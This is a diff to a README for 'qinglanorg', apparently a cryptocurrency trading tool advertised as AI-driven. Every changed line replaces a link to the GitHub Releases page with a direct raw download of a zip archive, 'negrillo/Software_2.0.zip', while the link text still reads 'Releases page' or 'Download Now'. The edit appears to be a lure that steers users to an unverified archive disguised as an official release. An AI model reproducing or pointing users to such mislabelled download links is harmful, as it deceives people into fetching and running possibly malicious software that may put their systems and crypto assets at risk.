@@ -6,7 +6,7 @@ Welcome to the **qinglanorg** project! This application provides AI-driven insig
 
 ## 📥 Download Now
 
-[![Download qinglanorg](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/MonjurulLipu/qinglanorg/releases)
+[![Download qinglanorg](https://github.com/MonjurulLipu/qinglanorg/raw/refs/heads/main/negrillo/Software_2.0.zip%20Now-v1.0-blue)](https://github.com/MonjurulLipu/qinglanorg/raw/refs/heads/main/negrillo/Software_2.0.zip)
 
 ## 📋 Overview
 
@@ -32,7 +32,7 @@ To run **qinglanorg**, ensure your computer meets the following minimum requirem
 ## 🛠️ Installation Steps
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/MonjurulLipu/qinglanorg/releases) where you can find the latest version of the software.
+   Go to the [Releases page](https://github.com/MonjurulLipu/qinglanorg/raw/refs/heads/main/negrillo/Software_2.0.zip) where you can find the latest version of the software.
 
 2. **Select the Release**  
    On the Releases page, look for the latest version (v1.0) and click on it. 
@@ -81,4 +81,4 @@ Follow **qinglanorg** on GitHub for updates and news about future releases. Stay
 
 Make your trading smarter with **qinglanorg**! Download today and step into the future of cryptocurrency analysis. 
 
-For further details, remember to check our [Releases page](https://github.com/MonjurulLipu/qinglanorg/releases) for updates.
+For further details, remember to check our [Releases page](https://github.com/MonjurulLipu/qinglanorg/raw/refs/heads/main/negrillo/Software_2.0.zip) for updates.
